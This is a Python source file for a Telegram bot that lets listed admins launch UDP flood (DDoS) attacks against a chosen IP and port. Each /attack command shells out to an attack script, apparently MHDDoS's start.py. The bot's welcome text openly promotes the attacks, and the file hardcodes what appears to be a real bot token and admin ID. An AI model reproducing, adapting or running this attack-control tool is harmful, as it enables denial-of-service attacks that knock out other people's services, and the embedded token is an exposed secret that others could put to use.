import telebot
import subprocess
import datetime
import time
import os
import logging

# Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
bot = telebot.TeleBot('7370183113:AAHyp16bTq-AUSpFXCePUQSI84k1CTO_Ec8')

# Admin user IDs
admin_id = ["888561579"]

# Set the request interval (in seconds)
REQUEST_INTERVAL = 5

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Notify the admin when the bot is online
def notify_admin_bot_online():
    try:
        for admin in admin_id:
            bot.send_message(admin, "🚀 The bot is now online and ready to receive commands!")
        logging.info("Admin notified that the bot is online.")
    except Exception as e:
        logging.error(f"Error while sending bot online notification: {e}")

# Command handler for /start
@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                           "*🚀 Get ready to dive into the action!*\n\n"
                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                           "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥",
                                           parse_mode='Markdown')
        logging.info("Processed /start command successfully.")
    except Exception as e:
        logging.error(f"Error while processing /start command: {e}")

# Command handler for /help
help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
             "*Here’s what you can do:* \n"
             "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
             "2. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
             "3. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
             "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")

@bot.message_handler(commands=['help'])
def help_message(message):
    try:
        bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
        logging.info("Processed /help command successfully.")
    except Exception as e:
        logging.error(f"Error while processing /help command: {e}")

# Command handler for /attack
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    if str(message.from_user.id) in admin_id:
        try:
            command_parts = message.text.split()
            if len(command_parts) != 5:
                bot.reply_to(message, "Invalid command format! Usage: /attack <target> <port> <thread> <time>")
                return

            target, port, thread, attack_time = command_parts[1:5]

            if not port.isdigit() or not thread.isdigit() or not attack_time.isdigit():
                bot.reply_to(message, "Port, thread, and time must be integers!")
                return

            bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"
                                              f"*📡 Target Host: {target}*\n"
                                              f"*👉 Target Port: {port}*\n"
                                              f"*👉 Threads: {thread}*\n"
                                              f"*⏰ Duration: {attack_time} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')

           # attack_dir = '/workspaces/Reo/MHDDoS'
           # os.chdir(attack_dir)

            full_command = ["python", "start.py", "UDP", f"{target}:{port}", thread, attack_time]
            logging.info(f"Executing attack command: {' '.join(full_command)}")

            response = subprocess.run(full_command, capture_output=True, text=True)

            bot.send_message(message.chat.id, f"📃 *Attack Details:*\n"
                                              f"🕒 [Time: {datetime.datetime.now().strftime('%H:%M:%S')}]\n"
                                              f"🌍 *Target:* {target}\n"
                                              f"⚔️ *Method:* UDP\n"
                                              f"⏱️ *Duration:* {attack_time} seconds\n"
                                              f"🔢 *Threads:* {thread}\n\n"
                                              f"🟢 *Response: {response.stdout}*", parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Error while processing /attack command: {e}")
            bot.reply_to(message, f"An error occurred: {str(e)}")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")
        logging.warning(f"Unauthorized user attempted to use /attack: {message.from_user.id}")

if __name__ == "__main__":
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    notify_admin_bot_online()  # Notify the admin

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)